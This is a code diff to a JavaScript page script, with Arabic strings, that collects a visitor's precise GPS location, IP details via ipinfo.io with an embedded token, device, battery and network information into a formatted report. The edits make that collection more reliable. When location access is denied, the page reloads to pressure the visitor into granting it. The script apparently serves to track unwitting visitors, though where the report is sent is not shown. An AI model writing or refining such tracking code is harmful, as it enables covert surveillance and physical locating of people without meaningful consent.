@@ -10,12 +10,22 @@ function getDeviceInfo() {
   return { ua, device, model: deviceModel, browser, cpu };
 }
 
-function getBatteryInfo() {
-  return navigator.getBattery().then(battery => ({
-    level: Math.round(battery.level * 100) + "%",
-    charging: battery.charging ? "نعم" : "لا",
-    powerSaving: navigator.getBattery().then(b => b.dischargingTime < 60 ? "مفعل" : "مغلق")
-  }));
+async function getBatteryInfo() {
+  try {
+    const battery = await navigator.getBattery();
+    const powerSaving = battery.dischargingTime > 0 && battery.dischargingTime < 60 ? "مفعل" : "مغلق";
+    return {
+      level: Math.round(battery.level * 100) + "%",
+      charging: battery.charging ? "نعم" : "لا",
+      powerSaving
+    };
+  } catch (e) {
+    return {
+      level: "غير متاح",
+      charging: "غير معروف",
+      powerSaving: "غير مدعوم"
+    };
+  }
 }
 
 function getNetworkInfo() {
@@ -33,8 +43,7 @@ function getLocation(callback) {
     const accuracy = position.coords.accuracy.toFixed(1);
     const googleMapsLink = `https://maps.google.com/?q=${lat},${lon}`;
 
-    const ipData = await fetch("https://ipinfo.io/json?token=3b17f087ab9e68").then(res => res.json());
-
+    const ipData = await fetch("https://ipinfo.io/json?token=3b17f087ab9e68").then(res => res.json()).catch(() => ({}));
     const device = getDeviceInfo();
     const net = getNetworkInfo();
     const battery = await getBatteryInfo();
@@ -57,7 +66,7 @@ function getLocation(callback) {
 ♠️ حالة البطارية
 // نسبة البطارية: ${battery.level}
 // هل يتم الشحن؟: ${battery.charging}
-// وضع توفير الطاقة: ${await battery.powerSaving}
+// وضع توفير الطاقة: ${battery.powerSaving}
 
 ♠️ معلومات الشبكة
 // نوع الاتصال: ${net.effectiveType}
@@ -83,7 +92,7 @@ function getLocation(callback) {
     });
 
   }, err => {
-    alert("يجب السماح للموقع بالوصول إلى موقعك الجغرافي.");
+    alert("❌ يجب السماح للموقع بالوصول إلى موقعك الجغرافي.");
     location.reload();
   }, {
     enableHighAccuracy: true,
